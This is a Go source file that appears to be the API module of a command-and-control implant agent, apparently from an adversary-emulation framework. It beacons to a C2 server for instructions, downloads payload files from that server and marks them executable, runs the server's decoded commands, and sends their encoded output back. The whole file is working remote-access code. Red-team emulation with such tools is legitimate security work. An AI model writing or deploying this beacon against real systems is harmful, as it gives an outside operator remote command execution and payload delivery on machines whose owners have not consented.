package api

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"reflect"
	"runtime"
	"strings"

	"../execute"
	"../util"
)

const (
	// TIMEOUT in seconds represents how long a single command should run before timing out
	TIMEOUT = 50
)

// Instructions is a single call to the C2
func Instructions(profile map[string]interface{}) map[string]interface{} {
	data, _ := json.Marshal(profile)
	address := fmt.Sprintf("%s/sand/instructions", profile["server"])
	bites := request(address, data)
	var out map[string]interface{}
	if bites != nil {
		fmt.Println("[+] beacon: ALIVE")
		var commands interface{}
		json.Unmarshal(bites, &out)
		json.Unmarshal([]byte(out["instructions"].(string)), &commands)
		out["sleep"] = int(out["sleep"].(float64))
		out["instructions"] = commands
	} else {
		fmt.Println("[-] beacon: DEAD")
	}
	return out
}

// Drop the payload
func Drop(server string, payload string) {
	location := filepath.Join(payload)
	if len(payload) > 0 && util.Exists(location) == false {
		fmt.Println(fmt.Sprintf("[*] Downloading new payload: %s", payload))
		address := fmt.Sprintf("%s/file/download", server)
		req, _ := http.NewRequest("POST", address, nil)
		req.Header.Set("file", payload)
		req.Header.Set("platform", string(runtime.GOOS))
		client := &http.Client{}
		resp, err := client.Do(req)
		if err == nil {
			dst, _ := os.Create(location)
			defer dst.Close()
			_, _ = io.Copy(dst, resp.Body)
			os.Chmod(location, 0500)
		}
	}
}

// Execute executes a command and posts results
func Execute(profile map[string]interface{}, command map[string]interface{}) {
	timeoutChan := make(chan bool, 1)
	resultChan := make(chan map[string]interface{}, 1)
	cmd := string(util.Decode(command["command"].(string)))
	status := "0"
	var result []byte
	go util.TimeoutWatchdog(timeoutChan, TIMEOUT)
	go execute.Execute(cmd, command["executor"].(string), resultChan)
ExecutionLoop:
	for {
		select {
		case data := <-resultChan:
			result = reflect.ValueOf(data["result"]).Bytes()
			if reflect.ValueOf(data["err"]).IsValid() {
				status = "1"
			}
			break ExecutionLoop
		case <-timeoutChan:
			result = []byte("Command execution timed out.")
			status = "124"
			break ExecutionLoop
		}
	}
	sendExecutionResults(command["id"], profile["server"], result, status, cmd)
}

// ExecuteInstruction takes the command and profile and executes that command step
func ExecuteInstruction(command map[string]interface{}, profile map[string]interface{}) {
	fmt.Printf("[*] Running instruction %.0f\n", command["id"])
	payloads := strings.Split(strings.Replace(command["payload"].(string), " ", "", -1), ",")
	for _, payload := range payloads {
		if len(payload) > 0 {
			Drop(profile["server"].(string), payload)
		}
	}
	Execute(profile, command)
}

func sendExecutionResults(command_id interface{}, server interface{}, result []byte, status string, cmd string) {
	address := fmt.Sprintf("%s/sand/results", server)
	link := fmt.Sprintf("%f", command_id.(float64))
	data, _ := json.Marshal(map[string]string{"link_id": link, "output": string(util.Encode(result)), "status": status})
	request(address, data)
	if cmd == "die" {
		fmt.Println("[+] Shutting down...")
		util.StopProcess(os.Getpid())
	}
}

func request(address string, data []byte) []byte {
	req, _ := http.NewRequest("POST", address, bytes.NewBuffer(util.Encode(data)))
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := ioutil.ReadAll(resp.Body)
	return util.Decode(string(body))
}